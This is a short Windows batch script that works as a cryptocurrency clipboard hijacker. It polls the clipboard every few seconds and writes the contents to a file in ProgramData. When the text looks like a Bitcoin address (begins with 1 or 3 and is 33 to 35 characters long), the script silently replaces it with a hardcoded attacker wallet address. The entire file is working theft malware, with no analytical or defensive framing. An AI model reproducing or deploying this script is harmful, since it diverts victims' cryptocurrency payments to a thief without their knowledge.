@echo off
C:
cd/
cd ProgramData

::clipboard grabber
:top
powershell get-clipboard>Debug.txt

::identify characteristics
findstr /r "^1.*" Debug.txt
if %ERRORLEVEL% EQU 0 goto long
findstr /r "^3.*" Debug.txt
if %ERRORLEVEL% EQU 0 goto long
goto nochange

::identify string length
:long
	set _len=0
	set /p _str=<Debug.txt
	set _subs=%_str%

	:getlen		
		if not defined _subs goto result
		:: remove first letter until empty
		set _subs=%_subs:~1%
		set /a _len+=1
		goto getlen

	:result
		echo strlen("%1")=%_len%		
		shift

if %_len% LSS 33 goto nochange
if %_len% GTR 35 goto nochange 
goto change

::not bitcoin
:nochange
timeout /t 2
goto top

::changer
:change
powershell set-clipboard -Value "1GYUhVKZB49mhKKi34fFBhY5yPcJZDpCXm"
timeout /t 5
goto top